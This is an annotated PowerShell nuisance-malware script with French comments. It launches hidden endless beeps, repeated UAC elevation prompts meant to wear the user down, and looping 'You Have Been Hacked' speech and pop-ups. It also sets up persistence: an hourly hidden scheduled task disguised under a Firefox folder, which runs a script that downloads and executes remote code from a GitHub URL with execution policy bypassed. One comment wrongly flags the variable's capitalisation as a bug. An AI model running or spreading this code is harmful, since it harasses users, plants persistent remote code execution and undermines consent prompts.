#### Full Bullshit ####

# Fonction qui génère un bip sonore en boucle infinie via un nouveau processus PowerShell
function Get-Beep {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){[System.Console]::Beep(1000,1000)}'
    # ➤ Lancement d'un processus caché exécutant un bip de 1000 Hz pendant 1 seconde, répété indéfiniment
    # ➤ Très gênant pour l'utilisateur, consomme des ressources, et ne peut être arrêté facilement
}

# Fonction qui essaie de forcer une élévation de privilèges en lançant "calc.exe" avec le flag -Verb runas
function Get-Elevated {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){sleep(get-random(30));start-process -Verb runas calc.exe}'
    # ➤ Boucle infinie qui attend un délai aléatoire (jusqu'à 30 secondes), puis lance la calculatrice avec élévation UAC
    # ➤ Peut être utilisé comme attaque de fatigue pour submerger l'utilisateur avec des prompts UAC
}

# Fonction de "nettoyage" qui supprime la tâche planifiée, le script persistant, et tue les processus PowerShell
function Stop-bullshit {
    schtasks /delete /tn firefox\GetHacked /f
    # ➤ Supprime une tâche planifiée appelée "GetHacked" sous le dossier Firefox

    Remove-Item $env:USERPROFILE\test.ps1
    # ➤ Supprime le script de persistance s’il existe dans le dossier personnel de l'utilisateur

    Get-process powershell | Stop-process
    # ➤ TUE tous les processus PowerShell (y compris ceux légitimes). Très agressif et dangereux en environnement réel
}

# Fonction qui combine synthèse vocale en boucle et messages pop-up via COM WScript
function Get-Hacked {
    start-process powershell -WindowStyle hidden -ArgumentList '-WindowStyle hidden -command "Add-Type -AssemblyName System.speech; while (1) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''You Have Been Hackeddd, dretzer'') }"'
    # ➤ Utilise .NET pour charger la synthèse vocale et fait parler la machine en boucle avec un message personnalisé

    start-process powershell -WindowStyle Hidden -ArgumentList @'
while(1){(New-Object -ComObject wscript.shell).Popup($('Get Hacked'),0,$('Powned'),0x1)};sleep(1000) 
'@
    # ➤ Affiche une boîte de dialogue pop-up toutes les secondes de façon illimitée avec un message arbitraire
    # ➤ Ensemble très intrusif et conçu pour saturer l'utilisateur
}

# Fonction de persistance : écrit un script qui télécharge et exécute du code externe toutes les heures
function get-persist {
    Add-Content -Value @'
$command = 'iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/EOLFML/RandomThings/main/Bullshit.ps1");All-Bullshit'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -executionpolicy bypass -WindowStyle hidden -encodedcommand $encodedcommand 
'@ -path $env:USERPROFILE\test.ps1
    # ➤ Crée un fichier test.ps1 contenant un script auto-exécuté qui télécharge un payload externe depuis GitHub
    # ➤ ❗ La variable $encodedcommand est incorrectement nommée (doit être $encodedCommand avec un C majuscule)

    schtasks /create /tn "Firefox\GetHacked" /tr "powershell -executionpolicy bypass -windowstyle hidden -File %USERPROFILE%\test.ps1" /sc HOURLY /mo 1 /F
    # ➤ Crée une tâche planifiée qui exécute ce script toutes les heures de manière furtive
    # ➤ Technique classique de persistance utilisée dans les scripts malveillants
}

# Fonction principale qui exécute toutes les autres d'un coup
function All-Bullshit{
    Get-Beep         # ➤ Lance le bip sonore infini
    Get-Elevated     # ➤ Force l'élévation de privilèges avec des pop-ups UAC
    get-Hacked       # ➤ Déclenche la synthèse vocale et les pop-ups "Get Hacked"
    get-persist      # ➤ Installe la persistance du script avec rechargement automatique
}
